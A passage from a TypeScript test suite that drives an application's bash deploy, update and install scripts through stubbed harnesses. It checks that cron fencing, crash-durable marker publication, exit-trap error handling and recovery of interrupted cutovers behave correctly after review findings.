      assert.equal(status, 9, `fence_cron must die when the backup cannot be published:\n${stdout}`)
      assert.match(stdout, /DIE: .*could not be backed up/, 'and say why')
      assert.ok(
        !/crontab -u appuser -$/m.test(log),
        `and it must NOT comment the crontab out with no backup anyone can restore: ${log}`,
      )
      assert.equal(existsSync(join(dir, 'crontab.bak')), false, 'and leave nothing at the backup path')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}

// ---------------------------------------------------------------------------
// FINDING 3 — the escape hatch closed the teardown window it promises to keep open.
//
// IMS_ALLOW_UNIDENTIFIED_DEV_RESPONDER=1 finishes a run in which NOTHING identified the
// process on the port. Its own warning, and the runbook, say the release is therefore not
// declared irreversible and a later failure can still be torn down. But the script cleared
// BOTH phase flags before restoring cron: a failure in that cleanup then matched none of the
// trap's four branches, so the trap did nothing at all and an unidentified process was left
// serving the migrated schema.
//
// Run for real: the tail of the script from the point-of-no-return decision to DEPLOY_OK,
// under the real exit trap, with the cron restore failing.
// ---------------------------------------------------------------------------

/** The end-of-cutover block, lifted verbatim: the arming decision through to DEPLOY_OK. */
function pointOfNoReturnBlock(source: string): string {
  const lines = source.split(/\r?\n/)
  const start = lines.findIndex((line) => /^if \$NEW_BUILD_SERVING \|\| \$DEV_RESPONDER_PROVEN \|\| \$DRY_RUN; then$/.test(line))
  assert.notEqual(start, -1, 'deploy.sh must decide the point of no return from the proofs, in one place')
  const end = lines.findIndex((line, index) => index > start && line === 'DEPLOY_OK=true')
  assert.notEqual(end, -1, 'and finish by declaring the deploy OK')
  return lines.slice(start, end + 1).join('\n')
}

function runPointOfNoReturn(state: string, unfenceRc: number): { log: string; stdout: string; trapExit: number } {
  const entry = R8_CASES.find((candidate) => candidate.name === 'deploy.sh')!
  const dir = mkdtempSync(join(tmpdir(), 'ims-r8-ponr-'))
  try {
    const dropinDir = join(dir, 'dropin')
    execFileSync('mkdir', ['-p', dropinDir])
    writeFileSync(join(dir, 'FENCED'), 'phase=stopping\nmigration_attempted=true\nschema_touched=true\n')
    writeFileSync(join(dropinDir, 'zz-deploy-fence.conf'), '[Unit]\n')
    writeFileSync(join(dir, 'crontab.bak'), '*/5 * * * * /usr/bin/true\n')

    const program = [
      'set -euo pipefail',
      entry.preamble(dir),
      TRAP_STUBS,
      entry.extra,
      R8_STUBS,
      `unfence_cron(){ echo "unfence_cron" >> "\${LOG}"; return ${unfenceRc}; }`,
      shellFunction(entry.source, 'restore_cron_from_backup_locked'),
      shellFunction(entry.source, 'restore_cron_from_backup'),
      shellFunction(entry.source, 'rollback_reboot_fence_install'),
      shellFunction(entry.source, 'unwind_arming'),
      shellFunction(entry.source, 'on_exit'),
      state,
      // The subshell absorbs the trap's own `exit` so the log can still be read afterwards.
      // It must NOT be an operand of `||`: bash suppresses errexit for every command of an
      // AND-OR list but the last, and the whole point here is that a failing cleanup step
      // reaches the trap the way it does in a real run.
      'set +e',
      `( trap on_exit EXIT; set -e\n${pointOfNoReturnBlock(entry.source)}\n)`,
      'TRAP_STATUS=$?',
      'set -e',
      'echo "TRAP_EXIT=${TRAP_STATUS}"',
    ].join('\n')
    const stdout = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
    return {
      log: readFileSync(join(dir, 'calls.log'), 'utf8'),
      stdout,
      trapExit: Number(/TRAP_EXIT=(\d+)/.exec(stdout)?.[1] ?? -1),
    }
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

/** Mid-cutover, at the moment the health phase hands over: stopped, migrated, cron fenced. */
const CUTOVER_STATE = [
  'FENCE_ARMED=true',
  'CUTOVER_ARMING=true',
  'CRON_FENCED=true',
  'CRON_BACKUP_CREATED=true',
  'SCHEMA_TOUCHED=true',
  'DB_FENCE_UP=false',
  'DEPLOY_OK=false',
  'PAST_POINT_OF_NO_RETURN=false',
].join('\n')

test('deploy.sh keeps the escape path tearable-down while its cleanup runs', () => {
  // The escape hatch: neither proof holds, so the point of no return is never armed. The
  // cron restore then fails.
  const result = runPointOfNoReturn(
    [CUTOVER_STATE, 'NEW_BUILD_SERVING=false', 'DEV_RESPONDER_PROVEN=false', 'DRY_RUN=false'].join('\n'),
    1,
  )

  assert.equal(result.trapExit, 1, `the failure status must reach the trap and survive it:\n${result.stdout}`)
  assert.match(
    result.stdout,
    /AFTER THE STOP/,
    `the trap must still recognise this as a post-stop failure — with both flags cleared it matched no branch at all and printed nothing:\n${result.stdout}`,
  )
  assert.match(result.log, /systemctl stop/, 'and re-stop whatever is holding the port')
  assert.match(result.log, /install_reboot_fence/, 'and re-establish the reboot fence')
  assert.match(result.log, /refence_db_connections/, 'and close the database again over a schema that has moved')
})

test('deploy.sh does NOT tear down a proven responder whose cleanup fails', () => {
  // The control that keeps the fix honest in the other direction: a run that proved its
  // responder is past the point of no return, and a failing cron restore must not stop it.
  const result = runPointOfNoReturn(
    [CUTOVER_STATE, 'NEW_BUILD_SERVING=false', 'DEV_RESPONDER_PROVEN=true', 'DRY_RUN=false'].join('\n'),
    1,
  )

  assert.match(result.stdout, /THE DEPLOY IS UP/, `a proven responder must reach the point-of-no-return branch:\n${result.stdout}`)
  assert.ok(!/systemctl stop/.test(result.log), `and nothing may stop it: ${result.log}`)
  assert.ok(!/refence_db_connections/.test(result.log), 'nor revoke CONNECT on a deploy that has already succeeded')
  assert.equal(result.trapExit, 1, 'the cleanup failure is still reported')
})

test('deploy.sh finishes the escape path cleanly when its cleanup succeeds', () => {
  // And the control that stops "leave FENCE_ARMED raised for ever" from passing the first
  // test: once cron and the marker are dealt with, the flag comes down and the run finishes.
  const result = runPointOfNoReturn(
    [CUTOVER_STATE, 'NEW_BUILD_SERVING=false', 'DEV_RESPONDER_PROVEN=false', 'DRY_RUN=false'].join('\n'),
    0,
  )

  assert.equal(result.trapExit, 0, `a completed escape-path run must exit 0:\n${result.stdout}`)
  assert.ok(!/systemctl stop/.test(result.log), `and tear nothing down: ${result.log}`)
  assert.ok(!/AFTER THE STOP/.test(result.stdout), 'and print no failure banner')
  assert.match(result.log, /unfence_cron/, 'the cleanup it was covering must actually have run')
})

// ===========================================================================
// o3d-2sm1.5, Codex r9 — ATOMIC IN MEMORY IS NOT DURABLE ACROSS A CRASH.
//
// r8 made the marker and the crontab backup atomic: a reader never sees a half-written
// file. That is a different property from durable. `> "$FENCE_FILE"` truncated the
// authoritative marker before filling it, and the cron backup was renamed with neither its
// data nor its containing directory flushed — so a power cut published an empty file over
// the only evidence the next run has, while publication had returned success.
//
// Everything below runs the shipped implementations. Where the property is an ORDERING,
// the order is observed by shimming `sync`, `mv` and `crontab` into one log, because no
// amount of reading the file back can distinguish "flushed" from "in the page cache".
// ===========================================================================

const R9_SCRIPTS = [
  { name: 'deploy.sh', source: DEPLOY_LINES.join('\n'), writer: 'write_fence_marker' },
  { name: 'update.sh', source: UPDATE_LINES.join('\n'), writer: 'write_fence_marker' },
  { name: 'install.sh', source: INSTALL_SOURCE, writer: 'write_cutover_marker' },
] as const

// ---------------------------------------------------------------------------
// FINDING 5 — the AND-OR harness defect, and the proof that this file no longer has it.
// ---------------------------------------------------------------------------

/** Run one trap-shaped program and report whether the body after a failure still ran. */
function errexitReaches(shape: (trap: string) => string): boolean {
  const program = [
    'set -euo pipefail',
    'demo_trap(){ false; echo REACHED_PAST_FAILURE; }',
    'set +e',
    shape('demo_trap'),
    'set -e',
    'true',
  ].join('\n')
  const out = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
  return !/REACHED_PAST_FAILURE/.test(out)
}

test('the trap harnesses in this file run with production errexit semantics', () => {
  // THE DEFECT, DEMONSTRATED. As the LEFT operand of an AND-OR list, bash suppresses
  // errexit for the whole subshell — so `false` inside the trap does not abort it and every
  // assertion about a failing cleanup step is made against semantics no real run has.
  assert.equal(
    errexitReaches((trap) => `( (exit 7) || ${trap} ) || TRAP_STATUS=$?`), // errexit-shape-demo
    false,
    'the old shape must be shown to suppress errexit, or this test is proving nothing',
  )

  // THE SHAPE NOW USED, at both sites: a standalone subshell that turns errexit back on and
  // installs the trap the way the script does, with `$?` read afterwards.
  assert.equal(
    errexitReaches((trap) => `( trap ${trap} EXIT; set -e; exit 7 )\nTRAP_STATUS=$?`),
    true,
    'the shape the harnesses use must let a failure inside the trap abort it',
  )
})

test('no harness in this file makes a trap the left operand of an AND-OR list', () => {
  // The sweep. r8 corrected this shape at one site and left it at another; the only way it
  // does not come back a third time is for the file to refuse to contain it.
  const self = readFileSync(join(process.cwd(), 'tests/scripts/deploy-order.test.ts'), 'utf8')
  const offenders = self
    .split(/\r?\n/)
    .map((line, index) => ({ line, index }))
    .filter(
      ({ line }) =>
        /\(\s*\(\s*exit\s+\d+\s*\)\s*\|\|/.test(line) &&
        !line.trimStart().startsWith('//') &&
        // The one legitimate occurrence: the test above BUILDS the defective shape in order
        // to demonstrate that it suppresses errexit. It is never used to test the scripts.
        !line.includes('errexit-shape-demo'),
    )
  assert.deepEqual(
    offenders.map(({ index }) => index + 1),
    [],
    `an errexit-suppressing trap harness survives at: ${offenders.map((o) => `${o.index + 1}: ${o.line.trim()}`).join('\n')}`,
  )
})

// ---------------------------------------------------------------------------
// FINDING 1 — the marker is published durably, and the last durable one is never truncated.
// ---------------------------------------------------------------------------

const R9_MARKER_PREAMBLE = (dir: string) => `
DRY_RUN=false
BLUE=''; GREEN=''; YELLOW=''; RED=''; BOLD=''; RESET=''
# THE REAL CRONTAB EXCLUSION, sourced rather than stubbed (o3d-p9dq): fence_cron and its siblings
# perform their read-modify-write through with_crontab_lock, so a harness without it would be
# measuring an ordering the shipped code no longer has. The lock file is created directly because
# prepare_crontab_lock needs root; its preparation is exercised in
# tests/settings/crontab-reconcile-serialization.test.ts.
source '${LOCK_LIB}'
crontab_lock_paths '${dir}'
mkdir -p "\${CRONTAB_LOCK_DIR}"
: > "\${CRONTAB_LOCK_FILE}"
CUTOVER_STATE_DIR='${dir}'
STATE_DIR='${dir}'
DATA_DIR='${dir}'
FENCE_FILE="\${CUTOVER_STATE_DIR}/DEPLOY-FENCED"
CRON_BACKUP="\${CUTOVER_STATE_DIR}/crontab-appuser.bak"
CURRENT_STEP=fence-writers
CUTOVER_STEP=fence-writers
APP_USER=appuser
APP_DIR=/opt/app
APP_DIR_REAL=/opt/app
APP_NAME=one-two-inventory
PORT=3000
FENCE_MASK=true
FENCE_ARMED=false
CUTOVER_ARMING=true
SCHEMA_TOUCHED=false
REBOOT_FENCE_INSTALLED=false
DB_FENCE_UP=false
BACKUP_FILE=''
SERVICE_UNITS=(app.service)
CRON_BACKUP_CREATED=false
CRON_FENCED=false
# o3d-secops r22: the shared lock and the connection-fence directory live under a ROOT-OWNED
# parent now, not under \${CUTOVER_STATE_DIR}, which the installer hands to \${APP_USER}. The rig
# points that parent inside its own anchored temporary tree for the same reason it points every
# other root there: an unprivileged harness cannot write /etc, and what is being measured is the
# mechanism, not the literal.
CUTOVER_ROOT_DIR='${dir}/cutover-root'
DB_FENCE_DIR="\${CUTOVER_ROOT_DIR}/db-fence"
DB_FENCE_STATE="\${DB_FENCE_DIR}/db-connect-fence.json"
LEGACY_STATE_DIR_DB_FENCE_STATE="\${CUTOVER_STATE_DIR}/deploy/db-connect-fence.json"
LOCK_FILE="\${CUTOVER_ROOT_DIR}/cutover.lock"
LEGACY_CUTOVER_STATE_DIR='${dir}/ims-deploy'
DB_FENCE_RELEASE_CMD='node fence-db-connections.mjs --release --app-host=localhost --app-port=5432 --app-user=imsapp --app-database=imsdb'
# o3d-2sm1.5 r19: the application's connection identity, which the helper is TOLD and never works
# out. Every entrypoint passes it on every fence invocation, and refuses when it cannot read it —
# the extracted functions below reference both exactly as the shipped scripts do.
DB_FENCE_IDENTITY_ARGS=('--app-host=localhost' '--app-port=5432' '--app-user=imsapp' '--app-database=imsdb')
require_db_identity() { [[ "\${#DB_FENCE_IDENTITY_ARGS[@]}" -eq 4 ]]; }
DB_IDENTITY_REASON=''
# o3d-2sm1.5 r20: and the second half of the same refusal — whether the file that identity was
# read from is the only thing that can define DATABASE_URL for the service. Stubbed to "yes" here
# because these harnesses are about the ORDER of the fence, the stop and the migration, not about
# where the identity came from; tests/scripts/db-connection-fence.test.ts exercises the question
# itself against a fake systemctl.
require_env_file_is_sole_definition() { return 0; }
DB_IDENTITY_SOURCE_REASON=''
# o3d-2sm1.5 r22: and the THIRD half — that the file still says what it said when the run
# pinned it, re-read at the fence, at the release and after the final daemon-reload. Stubbed
# to "unchanged" for the same reason: these harnesses are about ORDER, and the re-read is
# exercised against real files, real tampering and a fake systemctl in
# tests/scripts/db-connection-fence.test.ts.
require_start_identity_unchanged() { return 0; }
DB_IDENTITY_DRIFT_REASON=''
: "\${APP_DIR_REAL:=/opt/app}"
: "\${APP_DIR:=/opt/app}"
info(){ :; }
ok(){ :; }
success(){ :; }
warn(){ echo "WARN $*"; }
error(){ echo "ERR $*"; }
die(){ echo "DIE: $*" >&2; exit 1; }
`

/** The barrier log: every sync, rename and crontab call, in the order the script made them. */
const R9_BARRIER_SHIMS = `
BARRIERS="\${CUTOVER_STATE_DIR}/barriers.log"
: > "\${BARRIERS}"
# o3d-czpy r2: publish_durable_file() flushes its PINNED parent as \`..\` — the point of the fix
# is that it never names the destination again — so an operand that is a directory is recorded by
# the physical path it resolves to. A file operand (the temporary) is recorded verbatim, and the
# no-operand fallback stays distinguishable.
sync(){ local _p=""; if [[ -n "\${1:-}" ]]; then _p="\$(cd "\${1}" 2>/dev/null && pwd -P)" || _p=""; fi; echo "sync \${_p:-\$*}" >> "\${BARRIERS}"; command sync "\$@"; }
mv(){ echo "mv \$*" >> "\${BARRIERS}"; command mv "\$@"; }
crontab(){
  echo "crontab \$*" >> "\${BARRIERS}"
  if [[ " \$* " == *" -l "* ]]; then echo "*/5 * * * * /usr/bin/true"; return 0; fi
  # Drain stdin: the scripts pipe the fenced crontab in, and a shim that does not read it
  # kills the producing awk with SIGPIPE and fails the pipeline for a reason of our making.
  cat >/dev/null 2>&1 || true
  return 0
}
`

function runR9(
  entry: (typeof R9_SCRIPTS)[number],
  functions: string[],
  body: string,
  extra = '',
): { stdout: string; status: number; dir: string; files: string[]; marker: string | null; barriers: string[] } {
  const { outer, dir } = anchoredStateDir('ims-r9-')
  try {
    const program = [
      'set -euo pipefail',
      R9_MARKER_PREAMBLE(dir),
      extra,
      // o3d-czpy: publish_durable_file() stages through this directory, and it is lifted rather
      // than re-typed for the same reason its functions are.
      shellConstant(entry.source, 'PUBLISH_STAGE_DIRNAME'),
      // o3d-rn10: publish_durable_file() resolves its destination from a trusted ancestor now, so
      // wherever it is asked for, the table and the walk come with it. Named here rather than at
      // each call site: a rig missing them fails every publication with "command not found", and
      // every "the publish must fail" test then passes for the wrong reason.
      ...functions
        .flatMap((name) => (name === 'publish_durable_file'
          ? ['publish_trust_root_candidates', 'pin_publish_root_parent', 'publish_root_anchored', 'publish_trust_root', 'refuse_symlinked_root', 'pin_dir_beneath_root', name]
          : [name]))
        // o3d-secops r20: the same edges for the relocated marker. Every writer of it creates its
        // root-owned directory first, and the legacy import now moves a marker out of
        // ${CUTOVER_STATE_DIR} before it looks at the /var/lib/ims-deploy namespace at all.
        .flatMap((name) => (name === 'write_fence_marker' || name === 'write_cutover_marker'
          ? ['ensure_fence_marker_dir', name]
          : name === 'import_legacy_cutover_state'
            // o3d-secops r23: and the connection-fence record it no longer imports. Naming it is
            // an edge like any other; a rig without it fails with "command not found" and every
            // "the import must succeed" assertion below would then pass for the wrong reason.
            ? ['ensure_fence_marker_dir', 'import_relocated_fence_marker', 'warn_legacy_namespace_db_fence_state', name]
            : [name]))
        // o3d-secops r22: the namespace library's own edges. ensure_cutover_state_dirs() no longer
        // `mkdir -p`s anything — it walks to the directory and applies the owner and the mode to the
        // descriptor it lands on — and acquire_cutover_lock() opens, judges and locks a descriptor.
        // A rig that lifted either without the walk would fail with "command not found", and every
        // "the run must refuse" assertion below it would then pass for the wrong reason.
        .flatMap((name) => (name === 'ensure_cutover_state_dirs'
          ? ['enter_service_subdir', 'own_service_subdir', 'ensure_cutover_root_dir', name]
          : name === 'acquire_cutover_lock'
            ? ['enter_service_subdir', 'own_service_subdir', 'ensure_cutover_root_dir', 'ensure_cutover_state_dirs',
               'prepare_cutover_lock_file', 'verify_held_lock', 'narrow_held_lock', 'held_lock_mode',
               'lock_mode_is_private', 'rotate_cutover_lock_inode', 'dir_is_private_to_this_run',
               'acquire_legacy_namespace_lock', 'state_pre_r22_cutovers_are_not_excluded',
               'warn_pre_r22_db_fence_state', name]
            : [name]))
        .filter((name, index, all) => all.indexOf(name) === index)
        .map((name) => shippedShellFunction(entry.source, name)),
      body,
    ].join('\n')
    let stdout = ''
    let status = 0
    try {
      stdout = execFileSync('bash', ['-c', program], { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] })
    } catch (error) {
      const err = error as { status?: number; stdout?: string; stderr?: string }
      status = err.status ?? -1
      stdout = `${err.stdout ?? ''}${err.stderr ?? ''}`
    }
    const markerPath = join(dir, 'DEPLOY-FENCED')
    const barrierPath = join(dir, 'barriers.log')
    return {
      stdout,
      status,
      dir,
      files: execFileSync('bash', ['-c', `ls -A "${dir}"`], { encoding: 'utf8' }).split('\n').filter(Boolean),
      marker: existsSync(markerPath) ? readFileSync(markerPath, 'utf8') : null,
      barriers: existsSync(barrierPath) ? readFileSync(barrierPath, 'utf8').split('\n').filter(Boolean) : [],
    }
  } finally {
    rmSync(outer, { recursive: true, force: true })
  }
}

for (const entry of R9_SCRIPTS) {
  test(`${entry.name} fsyncs the marker data before the rename and the directory after it`, () => {
    // THE ORDERING IS THE PROPERTY. Data flushed after the rename can publish a name whose
    // content is not on the medium; a directory never flushed can lose the name itself,
    // however well the data was written. Observed, not asserted from the source.
    const result = runR9(entry, ['fsync_path', 'publish_durable_file', entry.writer], `${entry.writer} "under test"`, R9_BARRIER_SHIMS)
    assert.equal(result.status, 0, `the writer must succeed:\n${result.stdout}`)

    // o3d-czpy: the temporary is made INSIDE the root-owned staging directory and named
    // relative to it, so it is `./publish.XXXXXX` and no longer `DEPLOY-FENCED.XXXXXX` beside
    // the marker. The ordering being measured is unchanged.
    const dataBarrier = result.barriers.findIndex((line) => /^sync \.\/publish\.\w+$/.test(line))
    const rename = result.barriers.findIndex((line) => /^mv -f -T \.\/publish\.\w+ .*DEPLOY-FENCED$/.test(line))
    const dirBarrier = result.barriers.findIndex((line) => new RegExp(`^sync ${result.dir}$`).test(line))

    assert.notEqual(dataBarrier, -1, `the temporary must be fsynced: ${result.barriers.join(' | ')}`)
    assert.notEqual(rename, -1, `and published by rename: ${result.barriers.join(' | ')}`)
    assert.notEqual(dirBarrier, -1, `and the directory fsynced: ${result.barriers.join(' | ')}`)
    assert.ok(dataBarrier < rename, `the data barrier must precede the rename: ${result.barriers.join(' | ')}`)
    assert.ok(rename < dirBarrier, `and the directory barrier must follow it: ${result.barriers.join(' | ')}`)
  })

  test(`${entry.name} leaves the last durable marker untouched when a publish fails`, () => {
    // THE WHOLE POINT OF NOT TRUNCATING IN PLACE. The first publish succeeds; the second is
    // broken at the chmod, which is after the temporary has content and before anything is
    // renamed. What must survive is the FIRST marker, byte for byte — the old writer would
    // have left an empty file at exactly this instant.
    const result = runR9(
      entry,
      ['fsync_path', 'publish_durable_file', entry.writer],
      [
        `${entry.writer} "the durable one"`,
        'cp "${FENCE_FILE}" "${CUTOVER_STATE_DIR}/expected"',
        'chmod(){ return 1; }',
        'RC=0',
        `${entry.writer} "the one that fails" || RC=$?`,
        'echo "RC=${RC}"',
        'cmp -s "${FENCE_FILE}" "${CUTOVER_STATE_DIR}/expected" && echo MARKER_INTACT || echo MARKER_LOST',
      ].join('\n'),
    )

    assert.match(result.stdout, /RC=1/, `a publish that cannot complete must report failure:\n${result.stdout}`)
    assert.match(result.stdout, /MARKER_INTACT/, `and the last durable marker must survive it:\n${result.stdout}`)
    assert.ok(
      result.marker !== null && /^marker_complete=1$/m.test(result.marker),
      'and it is still a complete marker, not a truncated one',
    )
    // o3d-czpy: temporaries live in the root-owned staging directory now, so that is where a
    // leaked one would be. Checking only for `DEPLOY-FENCED.*` beside the marker would pass
    // whatever the publisher did.
    const staged = existsSync(join(result.dir, '.ims-publish'))
      ? readdirSync(join(result.dir, '.ims-publish'))
      : []
    assert.deepEqual(staged, [], `and no temporary may be left behind in the staging directory: ${staged.join(', ')}`)
    assert.deepEqual(
      result.files.filter((name) => name.startsWith('DEPLOY-FENCED.')),
      [],
      `nor beside the marker: ${result.files.join(', ')}`,
    )
  })

  test(`${entry.name} ends every published marker with the completeness sentinel`, () => {
    const result = runR9(entry, ['fsync_path', 'publish_durable_file', entry.writer], `${entry.writer} "under test"`)
    assert.ok(result.marker !== null, 'the marker must be published')
    const lines = (result.marker ?? '').split('\n').filter(Boolean)
    assert.equal(
      lines[lines.length - 1],
      'marker_complete=1',
      `the sentinel must be the LAST line, or it proves nothing about the lines above it:\n${result.marker}`,
    )
  })

  test(`${entry.name} fsyncs the crontab backup and its directory BEFORE it touches the crontab`, () => {
    // The r8 verification read the backup back and called that proof. Read-back is satisfied
    // by the page cache: a power loss after the crontab has been fenced can reboot with the
    // backup missing while publication returned success, and the resume then restores an
    // empty crontab or leaves cron commented out for ever.
    const result = runR9(
      entry,
      ['fsync_path', 'publish_cron_backup', 'fence_cron_locked', 'fence_cron'],
      'fence_cron',
      [R9_BARRIER_SHIMS, 'DRY_RUN=false', 'step(){ :; }', 'header(){ :; }'].join('\n'),
    )
    assert.equal(result.status, 0, `fence_cron must succeed:\n${result.stdout}`)

    const dataBarrier = result.barriers.findIndex((line) => /^sync .*crontab-appuser\.bak\.\w+$/.test(line))
    const rename = result.barriers.findIndex((line) => /^mv -f .*crontab-appuser\.bak\.\w+ .*crontab-appuser\.bak$/.test(line))
    const dirBarrier = result.barriers.findIndex((line) => new RegExp(`^sync ${result.dir}$`).test(line))
    const install = result.barriers.findIndex((line) => /^crontab -u appuser (?!-l)/.test(line))

    assert.notEqual(dataBarrier, -1, `the temporary backup must be fsynced: ${result.barriers.join(' | ')}`)
    assert.notEqual(rename, -1, `and published by rename: ${result.barriers.join(' | ')}`)
    assert.notEqual(dirBarrier, -1, `and the directory fsynced: ${result.barriers.join(' | ')}`)
    assert.notEqual(install, -1, `and the fenced crontab actually installed: ${result.barriers.join(' | ')}`)
    assert.ok(dataBarrier < rename, `data barrier before the rename: ${result.barriers.join(' | ')}`)
    assert.ok(rename < dirBarrier, `directory barrier after it: ${result.barriers.join(' | ')}`)
    assert.ok(
      dirBarrier < install,
      `and BOTH barriers before the crontab is written — otherwise the fence outlives its backup: ${result.barriers.join(' | ')}`,
    )
  })
}

// ---------------------------------------------------------------------------
// FINDING 1 (adoption half) — a marker with no completeness sentinel is UNKNOWN, not false.
// ---------------------------------------------------------------------------

for (const entry of R8_CASES) {
  test(`${entry.name} adopts a truncated marker as a possible migration, not as a clean stop`, () => {
    // Exactly what the pre-r9 in-place writer left behind when it was killed between the
    // truncation and the last line: a phase it cannot read, and a schema flag that is simply
    // absent. Adoption used to default that flag to false and RELEASE the connection fence.
    const result = runAdoption(entry, 'phase=stopping\nmigration_attempted=true\n', 'PREDECESSOR_ACTIVE=true')

    assert.equal(result.status, 0, `adoption must succeed:\n${result.stdout}`)
    assert.ok(
      !/release_db_connections/.test(result.log),
      `the connection fence must never be released on the strength of a line that was never written: ${result.log}`,
    )
    if (entry.name !== 'install.sh') {
      // install.sh re-fences through fence_db_connections and only when a fence state file
      // is present; the other two carry a dedicated adoption path.
      assert.match(result.log, /adopt_db_connections/, `the fence must be HELD over a schema that may have moved:\n${result.log}`)
    }
    assert.match(result.stdout, /AFTER_SCHEMA_TOUCHED=true/, 'and the unknown must be carried forward as "it may have moved"')
    assert.match(result.stdout, /marker_complete=1/, 'and the operator must be told why this marker was read the expensive way')
  })

  test(`${entry.name} still releases the fence for a COMPLETE marker that says nothing moved`, () => {
    // THE CONTROL, and the reason this is not just "always hold": a revoke nobody undoes is
    // an application that cannot reach its database at all. The only difference from the
    // test above is the sentinel.
    const result = runAdoption(
      entry,
      completeMarker('phase=stopping\nmigration_attempted=true\nschema_touched=false\n'),
      'PREDECESSOR_ACTIVE=true',
    )

    assert.equal(result.status, 0, `adoption must succeed:\n${result.stdout}`)
    assert.match(result.log, /release_db_connections/, `a complete marker saying nothing moved must release:\n${result.log}`)
    assert.ok(!/adopt_db_connections/.test(result.log), 'and must not hold a fence over a schema that never moved')
    assert.match(result.stdout, /AFTER_SCHEMA_TOUCHED=false/, 'and carry the fact forward as written')
  })

  test(`${entry.name} does not resume an interrupted arming it cannot read in full`, () => {
    // The arming resume is the one path that leaves a predecessor running, and it is gated
    // on schema_touched=false. A truncated marker cannot supply that, so it must fall
    // through to the ordinary adoption — which stops and re-fences.
    const result = runAdoption(entry, 'phase=arming\nmigration_attempted=true\n', 'PREDECESSOR_ACTIVE=true')

    assert.match(result.log, /systemctl stop/, `an unreadable arming must be adopted conservatively:\n${result.log}`)
    assert.match(result.log, /install_reboot_fence/, 'and the reboot fence re-established')
    assert.equal(result.markerExists, true, 'and the marker kept')
  })
}

// ---------------------------------------------------------------------------
// FINDING 4 — the `stopping` transition is written down BEFORE the stop is asked for.
// ---------------------------------------------------------------------------

for (const [name, lines] of [
  ['deploy.sh', DEPLOY_LINES],
  ['update.sh', UPDATE_LINES],
  ['install.sh', INSTALL_LINES],
] as const) {
  test(`${name} persists phase=stopping before it asks anything to stop`, () => {
    // Anchored on the CALL, because `FENCE_ARMED=true` also appears in adoption — where the
    // stop has already happened and there is nothing to persist ahead of.
    const persist = lines.findIndex((line) => isCode(line) && /^\s*persist_stop_requested$/.test(line))
    assert.notEqual(persist, -1, 'the stop phase must persist the transition it has just entered')

    let arm = -1
    for (let index = persist; index >= 0; index -= 1) {
      if (isCode(lines[index]) && /^\s*FENCE_ARMED=true$/.test(lines[index])) {
        arm = index
        break
      }
    }
    assert.notEqual(arm, -1, 'and it must sit under the flag it is recording')
    assert.ok(persist - arm <= 6, `the transition must be persisted immediately after the flag, not ${persist - arm} lines later`)

    const stopBetween = codeLine(lines, /systemctl stop/, arm)
    assert.ok(
      stopBetween === -1 || stopBetween > persist,
      'nothing may be stopped between raising the flag in memory and writing it to disk',
    )
    const stopAfter = codeLine(lines, /systemctl stop/, persist)
    assert.notEqual(stopAfter, -1, 'and the stop must actually follow it')
  })
}

for (const entry of R9_SCRIPTS) {
  test(`${entry.name} records phase=stopping durably, and refuses to stop if it cannot`, () => {
    // THE TRANSITION, WRITTEN. It used to live in shell memory until some later rewrite —
    // usually the exit trap, which a SIGKILL never reaches.
    const written = runR9(
      entry,
      ['fsync_path', 'publish_durable_file', entry.writer, 'persist_stop_requested'],
      ['FENCE_ARMED=true', 'persist_stop_requested', 'echo OK'].join('\n'),
    )
    assert.match(written.stdout, /OK/, `persisting the transition must succeed:\n${written.stdout}`)
    assert.match(written.marker ?? '', /^phase=stopping$/m, `and the marker on disk must say so:\n${written.marker}`)
    assert.match(written.marker ?? '', /^marker_complete=1$/m, 'as a complete marker')

    // AND THE REFUSAL. If the transition cannot be recorded, nothing may be stopped: a stop
    // whose interruption leaves no evidence is adopted as an arming and UNWOUND.
    //
    // FAILURE INJECTED ON THE PRE-RENAME SIDE OF THE BARRIER: the chmod runs before BARRIER 1
    // and long before the rename, so nothing new is ever visible and the last durable marker
    // is untouched. Since r10 it is the PUBLISHER'S RESULT that refuses here, so the message
    // is the durability one and the content grep below it never runs. The post-rename half of
    // this property — where the grep WOULD have passed — is asserted in the r10 block at the
    // end of this file, and neither side covers the other.
    const refused = runR9(
      entry,
      ['fsync_path', 'publish_durable_file', entry.writer, 'persist_stop_requested'],
      ['FENCE_ARMED=true', 'chmod(){ return 1; }', 'persist_stop_requested', 'echo REACHED_THE_STOP'].join('\n'),
    )
    assert.notEqual(refused.status, 0, `an unrecordable transition must abort:\n${refused.stdout}`)
    assert.ok(!/REACHED_THE_STOP/.test(refused.stdout), `and nothing after it may run: ${refused.stdout}`)
    assert.match(
      refused.stdout,
      /DIE: Could not (publish .* durably before stopping|record phase=stopping)/,
      `and it must say what it refused and why:\n${refused.stdout}`,
    )
  })
}

for (const entry of R8_CASES) {
  test(`${entry.name} adopts a persisted stop as a stop even with an unrelated listener on the port`, () => {
    // THE HARM THE MEMORY-ONLY FLAG CAUSED. With the marker still saying `arming`, adoption
    // fell through to the liveness heuristic — where ANY listener counts as the predecessor
    // — and UNWOUND the fences over a service that had already been asked to stop. Here the
    // unit is down, something else holds the port, and the marker is the only thing that
    // knows a stop was requested.
    // PORT (deploy.sh) and APP_PORT (update.sh, install.sh) are the same port under the two
    // names the scripts use; both are set so the listener is visible to whichever is read.
    const listener = [
      'PREDECESSOR_ACTIVE=false',
      'PORT=3000',
      'APP_PORT=3000',
      'ss(){ echo "LISTEN 0 511 0.0.0.0:3000 0.0.0.0:*"; return 0; }',
    ].join('\n')
    const result = runAdoption(entry, completeMarker('phase=stopping\nmigration_attempted=true\nschema_touched=false\n'), listener)

    assert.match(result.log, /systemctl stop/, `a persisted stop must be adopted by re-stopping:\n${result.log}`)
    assert.match(result.log, /install_reboot_fence/, 'and by re-establishing the reboot fence')
    assert.equal(result.markerExists, true, 'and the marker kept — this run owns the fence now')
    assert.equal(result.backupExists, true, 'and the crontab NOT handed back while nothing is serving')
    assert.match(result.stdout, /AFTER_FENCE_ARMED=true/, 'the stopping phase is entered')
    assert.ok(!/INTERRUPTED ARMING/.test(result.stdout), 'and it is never mistaken for an arming')
  })

  test(`${entry.name} would unwind the same listener if the marker still said arming`, () => {
    // THE CONTROL THAT MAKES THE TEST ABOVE MEAN SOMETHING. Identical state, identical
